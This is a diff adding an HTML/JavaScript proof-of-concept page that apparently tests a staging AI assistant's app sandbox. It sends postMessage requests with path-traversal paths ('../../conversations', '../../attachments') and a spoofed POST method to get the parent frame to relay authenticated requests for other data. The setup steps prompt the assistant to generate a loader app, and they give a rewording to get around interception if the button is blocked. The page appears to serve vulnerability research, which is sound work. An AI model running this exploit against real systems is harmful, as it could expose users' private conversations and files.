@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>AppSDK Security Validation</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: 'Segoe UI', monospace; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
+    h2 { color: #58a6ff; margin-top: 0; }
+    .mode { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+    .mode h3 { margin-top: 0; color: #f0883e; }
+    button { background: #238636; color: #fff; border: none; padding: 10px 20px; margin: 4px; cursor: pointer; border-radius: 6px; font-size: 14px; }
+    button:hover { background: #2ea043; }
+    button.danger { background: #da3633; }
+    button.danger:hover { background: #f85149; }
+    button.info { background: #1f6feb; }
+    button.info:hover { background: #388bfd; }
+    #log { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin-top: 12px;
+           max-height: 500px; overflow-y: auto; font-size: 13px; line-height: 1.6; }
+    .sent { color: #3fb950; }
+    .recv { color: #58a6ff; }
+    .err { color: #f85149; }
+    .info { color: #d29922; }
+    .hdr { color: #8b949e; border-bottom: 1px solid #21262d; padding-bottom: 4px; margin-bottom: 8px; display: block; }
+    code { background: #161b22; padding: 2px 6px; border-radius: 3px; }
+    .instructions { background: #1c2128; border-left: 3px solid #58a6ff; padding: 12px 16px; margin: 12px 0; border-radius: 0 6px 6px 0; }
+    .instructions ol { margin: 8px 0; padding-left: 20px; }
+    .instructions li { margin: 4px 0; }
+  </style>
+</head>
+<body>
+  <h2>AppSDK Security Validation</h2>
+
+  <div class="mode">
+    <h3 id="mode-label">Detecting mode...</h3>
+    <p id="mode-desc"></p>
+  </div>
+
+  <div id="setup-instructions" style="display:none">
+    <div class="instructions">
+      <b>Setup: Get this page inside the sandbox iframe</b>
+      <ol>
+        <li>Go to <code>https://www.copilot-stg.com/tasks</code></li>
+        <li>Ask Copilot: <i>"Create a web app with a button that opens
+            <code id="self-url">THIS_URL</code> in the current window when clicked"</i></li>
+        <li>Click the button in the generated app — it should load this page inside the sandbox</li>
+        <li>If the button doesn't work (intercepted), ask Copilot: <i>"Make the button use
+            window.location.href instead of window.open or an anchor tag"</i></li>
+      </ol>
+    </div>
+  </div>
+
+  <div>
+    <button onclick="sendBaseline()">1. Baseline (normal path)</button>
+    <button class="danger" onclick="sendTraversal1()">2. Traversal (../../conversations)</button>
+    <button class="danger" onclick="sendTraversal2()">3. Traversal (../../attachments)</button>
+    <button class="danger" onclick="sendMethodSpoof()">4. Method spoof (POST)</button>
+    <button class="info" onclick="sendAllAndReport()">Run all & show report</button>
+  </div>
+
+  <div id="log"></div>
+
+<script>
+(function() {
+  var counter = 0;
+  var results = {};
+
+  // Detect if running inside the sandbox iframe or standalone
+  var isInsideSandbox = (window.parent !== window);
+  var modeLabel = document.getElementById('mode-label');
+  var modeDesc = document.getElementById('mode-desc');
+  var setupInstructions = document.getElementById('setup-instructions');
+  var selfUrl = document.getElementById('self-url');
+
+  if (selfUrl) selfUrl.textContent = window.location.href;
+
+  if (isInsideSandbox) {
+    modeLabel.textContent = 'Running INSIDE sandbox iframe';
+    modeDesc.innerHTML = 'Messages will be sent via <code>postMessage</code> to <code>window.parent</code>.<br>' +
+      'The sandbox relays them to <code>copilot-stg.com</code> which makes authenticated HTTP requests.<br>' +
+      'Origin: <b>' + (window.location.origin || 'null/blob') + '</b>';
+    setupInstructions.style.display = 'none';
+  } else {
+    modeLabel.textContent = 'Running STANDALONE (not inside sandbox)';
+    modeDesc.innerHTML = 'You need to get this page loaded inside the Copilot sandbox iframe for the exploit to work.<br>Follow the setup instructions below.';
+    setupInstructions.style.display = 'block';
+  }
+
+  // Listen for responses
+  window.addEventListener('message', function(event) {
+    if (event.data && event.data.type === 'app-data:response') {
+      var p = event.data.payload;
+      results[p.requestId] = p;
+      log('[RECV id=' + p.requestId + '] ok=' + p.ok + ' status=' + p.status +
+          ' data=' + JSON.stringify(p.data).substring(0, 300), 'recv');
+    }
+  });
+
+  function log(msg, cls) {
+    var el = document.getElementById('log');
+    var div = document.createElement('div');
+    div.className = cls || '';
+    div.textContent = msg;
+    el.appendChild(div);
+    el.scrollTop = el.scrollHeight;
+  }
+  window.log = log;
+
+  function send(method, path, body, label) {
+    var requestId = 'poc-' + (++counter) + '-' + label;
+    if (!isInsideSandbox) {
+      log('[SKIP] Not inside sandbox — message would not reach Copilot. See setup instructions.', 'err');
+      return requestId;
+    }
+    var msg = {
+      type: 'app-data:request',
+      timestamp: Date.now(),
+      payload: { method: method, path: path, body: body, requestId: requestId }
+    };
+    window.parent.postMessage(msg, '*');
+    log('[SENT ' + label + '] ' + method + ' path="' + path + '"  id=' + requestId, 'sent');
+    return requestId;
+  }
+
+  window.sendBaseline = function() {
+    log('--- Baseline: normal entity path ---', 'hdr');
+    send('GET', 'test-entity/test-type', undefined, 'baseline');
+  };
+
+  window.sendTraversal1 = function() {
+    log('--- Traversal: ../../conversations ---', 'hdr');
+    log('If parent builds URL as apiBase + "/app-data/" + path, this resolves outside /app-data/', 'info');
+    send('GET', '../../conversations', undefined, 'traversal-conversations');
+  };
+
+  window.sendTraversal2 = function() {
+    log('--- Traversal: ../../attachments ---', 'hdr');
+    send('GET', '../../attachments', undefined, 'traversal-attachments');
+  };
+
+  window.sendMethodSpoof = function() {
+    log('--- Method spoof: POST (only GET/PUT/DELETE expected) ---', 'hdr');
+    send('POST', 'test-entity/test-type', { data: 'spoofed' }, 'method-spoof');
+  };
+
+  window.sendAllAndReport = function() {
+    log('=== Running all tests ===', 'hdr');
+    results = {};
+    var ids = [];
+    ids.push(send('GET', 'test-entity/test-type', undefined, 'baseline'));
+    ids.push(send('GET', '../../conversations', undefined, 'traversal'));
+    ids.push(send('POST', 'x/y', { data: 'test' }, 'method-spoof'));
+
+    // Wait for responses then print summary
+    setTimeout(function() {
+      log('', '');
+      log('=== RESULTS SUMMARY ===', 'hdr');
+      ids.forEach(function(id) {
+        var r = results[id];
+        if (r) {
+          var verdict = r.ok ? 'RELAYED (vulnerable)' : 'REJECTED (status ' + r.status + ')';
+          log('[' + id + '] ' + verdict, r.ok ? 'err' : 'recv');
+        } else {
+          log('[' + id + '] NO RESPONSE (message may have been dropped — good)', 'recv');
+        }
+      });
+    }, 5000);
+  };
+})();
+</script>
+</body>
+</html>
